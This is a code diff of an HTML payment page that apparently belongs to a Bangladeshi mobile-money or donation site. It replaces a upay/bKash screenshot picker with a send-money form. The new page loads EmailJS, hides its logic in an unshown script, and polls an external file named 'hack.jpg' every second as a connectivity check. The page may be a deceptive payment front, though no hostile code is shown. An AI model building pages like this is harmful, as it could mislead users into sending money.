@@ -1,236 +1,140 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Payment</title>
-  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-* {
-  box-sizing: border-box;
-}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>payment</title>
+     <link
+      rel="stylesheet"
+      data-purpose="Layout StyleSheet"
+      title="Web Awesome"
+      href="/css/app-wa-09b459cf485d4b1f3304947240314c05.css?vsn=d"
+    >
 
-html, body {
-  font-family: 'Montserrat', sans-serif;
-  display: flex;
-  width: 100%;
-  height: auto;
-  background: #fff;
-  justify-content: center;
-  align-items: center;
-  margin: 0;
-}
+      <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.6.0/css/all.css"
+      >
 
-.checkout-panel {
-  display: flex;
-  flex-direction: column;
-  width: 100%;
-  height:100%;
-  max-width: 940px;
-  background-color: rgb(255, 255, 255);
-  opacity:0;
-  transform: translateY(20px);
-  animation: fadeIn .5s forwards;
-}
+      <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-duotone-solid.css"
+      >
 
-@keyframes fadeIn {
-  to {
-    opacity: 1;
-    transform: translateY(0);
-  }
-}
+      <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-thin.css"
+      >
 
-.panel-body {
-  padding: 20px;
-  flex: 1;
-}
+      <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-solid.css"
+      >
 
-.title {
-  font-weight: 700;
-  margin-top: 10px;
-  margin-bottom: 20px;
-  color: #2e2e2e;
-  text-align: center;
-}
+      <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-regular.css"
+      >
 
-.payment-method {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  margin-bottom: 20px;
-}
+      <link
+        rel="stylesheet"
+        href="https://site-assets.fontawesome.com/releases/v6.6.0/css/sharp-light.css"
+      ><link rel="stylesheet" href="send.css">
 
-.method {
-  display: flex;
-  flex-direction: column;
-  width: 90%;
-  max-width: 400px;
-  height: auto;
-  padding: 20px;
-  border: 1px solid #ccc;
-  border-radius: 10px;
-  background-color: #fff;
-  justify-content: center;
-  align-items: center;
-  margin: 10px 0;
-  cursor: pointer;
-  transition: border-color 0.3s ease;
-}
-
-.method.selected {
-  border: 2px solid #1aad49;
-}
-
-.card-logos {
-  display: flex;
-  height: 40px;
-  justify-content: space-between;
-  align-items: center;
-}
-
-.card-logos img {
-  margin:5px;
-  max-width: 100%;
-  max-height: 100%;
-}
-
-.radio-input {
-  margin-top: 20px;
-  text-align: center;
-}
-
-input[type='radio'] {
-  display: none;
-}
-
-.panel-footer {
-  display: flex;
-  flex-direction: row;
-  width: 100%;
-  padding: 10px;
-  background-color: rgb(239, 239, 239);
-  justify-content: center;
-  align-items: center;
-  border-radius: 10px;
-}
-
-.panel-footer .btn {
-  font-size: 16px;
-  width: 100%;
-  max-width: 200px;
-  height: 48px;
-  margin: 10px;
-  transition: all .2s ease-in-out;
-  letter-spacing: 1px;
-  border: none;
-  border-radius: 23px;
-}
-
-.back-btn {
-  color: #f62f5e;
-  background: #fff;
-}
-
-.next-btn {
-  color: #fff;
-  background: #f62f5e;
-  font-weight:bold;
-}
-
-.btn:focus {
-  outline: none;
-}
-
-.btn:hover {
-  transform: scale(1.05);
-}
-
-@media (min-width: 768px) {
-  .checkout-panel {
-    width: 80%;
-  }
-
-  .payment-method {
-    flex-direction: row;
-    justify-content: space-between;
-  }
-
-  .method {
-    margin: 0 10px;
-  }
-
-  .panel-footer {
-    flex-direction: row;
-    justify-content: space-between;
-  }
-
-  .panel-footer .btn {
-    margin: 0;
-  }
-}
-  </style>
 </head>
 <body>
-
-  <div class="checkout-panel">
-    <div class="panel-body">
-      <h2 class="title">অর্থপ্রদানের পদ্ধতি নির্বাচন করুন</h2>
-
-      <div class="payment-method">
-        <label for="card" class="method card" onclick="selectMethod(this, 'upay')">
-          <div class="card-logos">
-            <img style="pointer-events: none" src="https://play-lh.googleusercontent.com/cCVvEEwDQSPmDO8F-kryWhvzy53JllG1FGtHGDG-SDgfVTvvYSvWEXXDbgAY0hf7Bg" alt="UPT Logo"/>
-          </div>
-          <div class="radio-input">
-            <input id="card" type="radio" name="payment" value="upay">
-            upay এর স্ক্রিনশট জমা দিন
-          </div>
-        </label>
-
-        <label for="Bkash" class="method paypal" onclick="selectMethod(this, 'bkash')">
-          <div class="card-logos">
-            <img style="pointer-events: none" src="https://proyojoniobazar.github.io/shop/Bkash2.png" alt="Bkash Logo"/>
-          </div>
-          <div class="radio-input">
-            <input id="Bkash" type="radio" name="payment" value="bkash">
-            বিকাশের স্ক্রিনশট জমা দিন
-          </div>
-        </label>
-      </div>
-
-      <div class="panel-footer">
-        <button style="text-decoration:none;color:black" class="btn back-btn" onclick="window.history.back()">Back</button>
-        <button class="btn next-btn" onclick="redirectToLink()">Add Money</button>
-      </div>
+    <div class="navbar">
+        <button onclick="window.history.back()"><i class="fa-duotone fa-solid fa-arrow-left"></i></button>
+        <div class="title">Payment</div><div class="no-connection-popup" id="no-connection-popup">
+        <div class="icon"><i class="fa-duotone fa-solid fa-wifi-slash"></i></div>
+        <h1>ইন্টারনেট সংযোগ নেই!</h1>
+            
     </div>
-  </div>
+    </div>
+ <div class="no-connection-popup" id="no-connection-popup2">
+        <div class="icon"><i class="fa-duotone fa-solid fa-ban"></i></div>
+        <h1>কোনো একটি সমস্যা হচ্ছে!</h1>
+        </div>
+    <div style="background-color: #c6f7d6;border-left: 5px solid #52ff8b"class="no-connection-popup" id="no-connection-popup3">
+        <div class="icon"><i  style="color:green"class="fa-duotone fa-solid fa-badge-check"></i></div>
+        <h1>Payment সম্পূর্ণ হয়েছে!</h1>
+    </div>
+   
+    
+    </div>
+    <form id="send-money-form">
+       <div class="form-header">
+            <label for="name">Foundation name</label>
+<input id="name" placeholder="Name" readonly>
+</div>
+        <div class="form-group">
+            <label for="amount">Amount</label>
+            <input type="tel" id="amount" placeholder="$">
+        </div>
+        <div class="available-balance">
+            <span>Account Balance:</span>
+            <span style="color:green;font-weight: bold" id="balance">loading</span>
+        </div>
+        <div class="description-field" id="description-field">
+            <label for="description">Description</label>
+            <input type="text" id="description" value="Dension ">
+        </div>
+        <div style="color:red;font-size:16px;margin-top:10px;text-align:center" id="result"></div>
+        <button class="send-button" id="send-button"><i class="fa-duotone fa-solid fa-hand-holding-circle-dollar"></i></button>
+        <div class="description-link" id="description-link">+ Add Message</div>
+    </form>
+    <script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script><script>
+let audioPlayed = false;
+const audioElement = new Audio('fail.mp3');
 
-  <script>
-    let selectedMethod = null;
+// Preload the audio
+audioElement.preload = 'auto';
+audioElement.load();
 
-    function selectMethod(element, method) {
-      // Remove 'selected' class from all methods
-      document.querySelectorAll('.method').forEach(function (el) {
-        el.classList.remove('selected');
-      });
-      
-      // Add 'selected' class to clicked method
-      element.classList.add('selected');
-      
-      // Set selected method
-      selectedMethod = method;
+async function checkInternetConnection() {
+    const netpopup = document.getElementById('no-connection-popup');
+    
+    try {
+        // Attempt to fetch the first resource
+        const response1 = await fetch('https://unpob.github.io/app/hack.jpg',{ method: 'HEAD', cache: 'no-store' });
+        
+        if (!response1.ok) {
+            throw new Error('First link offline');
+        }
+        
+        netpopup.style.display = 'none';
+    } catch (error) {
+        setTimeout(function() {
+    window.history.back();
+}, 500);
+        netpopup.style.display = 'block';
+        playAudioOnce();
+      return;
     }
-
-    function redirectToLink() {
-      if (selectedMethod === 'upay') {
-        window.location.href = 'autoupay.html';
-      } else if (selectedMethod === 'bkash') {
-        window.location.href = 'autobk.html';
-      } else {
-        alert('Please select a payment method.');
-      }
+    // Reset the reload flag if connection is restored
+    if (sessionStorage.getItem('reloaded') === 'true') {
+        sessionStorage.removeItem('reloaded');
+        location.reload();
     }
-  </script>
+}
 
+function playAudioOnce() {
+    if (!audioPlayed) {
+        audioElement.play().catch(error => {
+            console.error('Audio playback failed:', error);
+        });
+        audioPlayed = true;
+    }
+}
+
+window.addEventListener('load', checkInternetConnection);
+setInterval(checkInternetConnection, 1000);
+</script>
+
+<script type="text/javascript" src="pay.js">
+  
+            </script>
 </body>
 </html>
